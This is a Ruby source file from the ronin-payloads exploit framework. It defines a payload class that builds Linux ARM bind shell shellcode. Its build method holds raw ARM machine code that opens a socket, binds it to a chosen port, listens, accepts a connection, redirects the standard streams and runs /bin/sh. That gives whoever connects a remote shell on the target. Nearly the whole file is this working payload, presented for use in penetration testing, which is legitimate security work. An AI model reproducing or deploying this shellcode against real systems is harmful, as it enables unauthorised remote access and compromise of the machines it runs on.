# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/bind_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module ARM
          #
          # Linux ARM shellcode that binds a shell to a port.
          #
          class BindShell < BindShellPayload

            register 'shellcode/linux/arm/bind_shell'

            arch :arm
            os :linux

            author 'Daniel Godas-Lopez', email: 'dgodas@gmail.com'

            summary 'Linux ARM bind shell shellcode'
            description <<~DESC
              Linux ARM shellcode that binds a shell to a port.
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-730.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              sin_port_hi = packed_port[0]
              sin_port_lo = packed_port[1]

              @payload = "\x02\x00\xa0\xe3" \
                         "\x01\x10\xa0\xe3" \
                         "\x06\x20\xa0\xe3" \
                         "\x07\x00\x2d\xe9" \
                         "\x01\x00\xa0\xe3" \
                         "\x0d\x10\xa0\xe1" \
                         "\x66\x00\x90\xef" \
                         "\x0c\xd0\x8d\xe2" \
                         "\x00\x60\xa0\xe1" \
                         "#{sin_port_lo}\x10\xa0\xe3" \
                         "#{sin_port_hi}\x70\xa0\xe3" \
                         "\x01\x1c\xa0\xe1" \
                         "\x07\x18\x81\xe0" \
                         "\x02\x10\x81\xe2" \
                         "\x02\x20\x42\xe0" \
                         "\x06\x00\x2d\xe9" \
                         "\x0d\x10\xa0\xe1" \
                         "\x10\x20\xa0\xe3" \
                         "\x07\x00\x2d\xe9" \
                         "\x02\x00\xa0\xe3" \
                         "\x0d\x10\xa0\xe1" \
                         "\x66\x00\x90\xef" \
                         "\x14\xd0\x8d\xe2" \
                         "\x01\x10\xa0\xe3" \
                         "\x06\x00\xa0\xe1" \
                         "\x03\x00\x2d\xe9" \
                         "\x04\x00\xa0\xe3" \
                         "\x0d\x10\xa0\xe1" \
                         "\x66\x00\x90\xef" \
                         "\x08\xd0\x8d\xe2" \
                         "\x06\x00\xa0\xe1" \
                         "\x01\x10\x41\xe0" \
                         "\x02\x20\x42\xe0" \
                         "\x07\x00\x2d\xe9" \
                         "\x05\x00\xa0\xe3" \
                         "\x0d\x10\xa0\xe1" \
                         "\x66\x00\x90\xef" \
                         "\x0c\xd0\x8d\xe2" \
                         "\x00\x60\xa0\xe1" \
                         "\x02\x10\xa0\xe3" \
                         "\x06\x00\xa0\xe1" \
                         "\x3f\x00\x90\xef" \
                         "\x01\x10\x51\xe2" \
                         "\xfb\xff\xff\x5a" \
                         "\x04\x10\x4d\xe2" \
                         "\x02\x20\x42\xe0" \
                         "\x2f\x30\xa0\xe3" \
                         "\x62\x70\xa0\xe3" \
                         "\x07\x34\x83\xe0" \
                         "\x69\x70\xa0\xe3" \
                         "\x07\x38\x83\xe0" \
                         "\x6e\x70\xa0\xe3" \
                         "\x07\x3c\x83\xe0" \
                         "\x2f\x40\xa0\xe3" \
                         "\x73\x70\xa0\xe3" \
                         "\x07\x44\x84\xe0" \
                         "\x68\x70\xa0\xe3" \
                         "\x07\x48\x84\xe0" \
                         "\x73\x50\xa0\xe3" \
                         "\x68\x70\xa0\xe3" \
                         "\x07\x54\x85\xe0" \
                         "\x3e\x00\x2d\xe9" \
                         "\x08\x00\x8d\xe2" \
                         "\x00\x10\x8d\xe2" \
                         "\x04\x20\x8d\xe2" \
                         "\x0b\x00\x90\xef".b
            end

          end
        end
      end
    end
  end
end
